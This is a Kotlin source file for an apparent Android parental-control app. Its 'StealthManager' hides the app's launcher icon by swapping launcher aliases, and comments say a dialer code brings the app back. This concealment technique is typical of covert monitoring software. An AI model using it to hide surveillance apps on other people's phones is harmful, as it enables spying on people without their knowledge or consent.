package com.example.parentalcontrol

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log

import android.content.Intent
import android.os.Handler
import android.os.Looper

/**
 * مدير التخفي
 * يقوم بإخفاء أيقونة التطبيق من القائمة وتفعيلها عبر رمز الاتصال
 */
object StealthManager {

    private const val TAG = "StealthManager"

    /**
     * إخفاء أيقونة التطبيق - الطريقة القسرية (v33 Nuclear Fix)
     * تقوم بتعطيل النشاط الرئيسي وتسمح للنظام بقتل العملية لإنعاش الكاش
     */
    fun hideAppIcon(context: Context) {
        try {
            val pkg = context.packageManager
            val visibleAlias = ComponentName(context, "${context.packageName}.LauncherAliasVisible")
            val hiddenAlias = ComponentName(context, "${context.packageName}.LauncherAliasHidden")

            Log.d(TAG, "v35 TWIN-ALIAS hiding initiated (Transparent Invisibility)")

            // 1. Enable Hidden (Transparent) Alias first to ensure continuity
            pkg.setComponentEnabledSetting(
                hiddenAlias,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )

            // 2. Disable Visible Alias (Forcedkill to refresh Launcher)
            pkg.setComponentEnabledSetting(
                visibleAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                0 // Zero flags targets the launcher refresh
            )

            // Save state
            context.getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
                .edit().putBoolean("icon_hidden", true).apply()

            Log.i(TAG, "Switch to Transparent Alias complete (v35)")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide launcher icon: ${e.message}")
        }
    }

    /**
     * إظهار أيقونة التطبيق (لأغراض المعايرة أو الإعداد)
     */
    fun showAppIcon(context: Context) {
        try {
            val pkg = context.packageManager
            val visibleAlias = ComponentName(context, "${context.packageName}.LauncherAliasVisible")
            val hiddenAlias = ComponentName(context, "${context.packageName}.LauncherAliasHidden")

            Log.d(TAG, "v35 TWIN-ALIAS showing initiated")

            // 1. Enable Visible Alias
            pkg.setComponentEnabledSetting(
                visibleAlias,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )

            // 2. Disable Hidden (Transparent) Alias
            pkg.setComponentEnabledSetting(
                hiddenAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                0 // Kill to refresh
            )

            // Save state
            context.getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
                .edit().putBoolean("icon_hidden", false).apply()
                
            Log.i(TAG, "MainActivity enabled successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to show launcher icon: ${e.message}")
        }
    }

    /**
     * التحقق مما إذا كانت الأيقونة مخفية
     */
    fun isIconHidden(context: Context): Boolean {
        // We use SharedPreferences as the source of truth for the toggle logic
        // because setComponentEnabledSetting can be slow to report its new state.
        return context.getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
            .getBoolean("icon_hidden", false)
    }

    /**
     * تبديل حالة التخفي (Toggle)
     */
    fun toggleStealthMode(context: Context) {
        val currentlyHidden = isIconHidden(context)
        Log.i(TAG, "Toggling stealth mode (v33). Currently hidden: $currentlyHidden")

        if (currentlyHidden) {
            // 1. First enable
            showAppIcon(context)
            
            // 2. Clear state in prefs immediately
            context.getSharedPreferences("stealth_prefs", Context.MODE_PRIVATE)
                .edit().putBoolean("icon_hidden", false).apply()

            // 3. Explicit Launch
            Handler(Looper.getMainLooper()).postDelayed({
                launchApp(context)
            }, 300)
        } else {
            hideAppIcon(context)
        }
    }

    /**
     * تشغيل الواجهة الرئيسية (LoginActivity) بأمان
     */
    fun launchApp(context: Context) {
        try {
            // نستخدم MainActivity كمشغل أساسي في v33
            val i = Intent(context, MainActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_CLEAR_TOP or
                    Intent.FLAG_ACTIVITY_SINGLE_TOP
                )
            }
            context.startActivity(i)
            Log.i(TAG, "MainActivity launched explicitly")
        } catch (e: Exception) {
            Log.e(TAG, "launchApp failed: ${e.message}")
        }
    }
}
